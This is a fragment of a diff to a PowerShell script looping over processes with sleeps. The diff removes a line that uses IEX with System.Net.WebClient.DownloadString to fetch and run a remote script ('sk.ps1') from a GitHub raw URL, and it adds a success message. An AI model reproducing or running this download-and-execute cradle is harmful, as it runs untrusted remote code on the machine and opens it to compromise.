@@ -5,7 +5,7 @@ ForEach ($process in $processes) {
 
     
     Start-Sleep -Seconds 20
+  
+    Write-Output "Files are successfully created in ----"
     $i++
-    IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/hmdsazzad17/test/main/sk.ps1');
-    
 }
